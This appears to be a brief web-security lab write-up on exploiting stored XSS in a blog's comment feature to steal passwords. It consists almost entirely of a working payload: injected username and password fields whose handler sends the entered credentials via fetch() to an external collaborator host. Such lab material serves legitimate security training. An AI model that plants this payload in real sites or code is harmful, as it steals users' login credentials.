Lab #15 - Exploiting cross-site scripting to capture passwords

Target Goal - Exploit stored XSS vulnerability in the blog comment functionality to exfiltrate the victim's username and password. 

Analysis:


<input name=username id=username>
<input type=password name=password onchange="if(this.value.length) fetch('https://yegpr9y3bh9i9mgrxv32oywmedk48vwk.oastify.com', {
    method: 'POST',
    mode: 'no-cors',
    body: username.value+':'+this.value
});">